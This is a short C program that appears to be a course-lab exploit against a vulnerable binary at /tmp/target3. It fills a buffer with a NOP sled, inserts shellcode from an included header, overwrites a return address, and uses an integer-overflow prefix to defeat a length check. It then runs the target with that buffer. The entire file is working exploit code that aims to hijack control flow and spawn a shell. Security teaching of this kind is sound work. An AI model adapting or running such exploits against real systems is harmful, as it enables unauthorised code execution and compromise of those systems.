#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];
  char buffer[241*20];
  memset(buffer, 0x90, 241*20);

  strncpy(buffer, "2147483889,", 11);
  strncpy(buffer+(235*20), shellcode, 45);
  strncpy(buffer+(240*20)+15, "\xfc\xfe\xff\xbf", 4);

  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
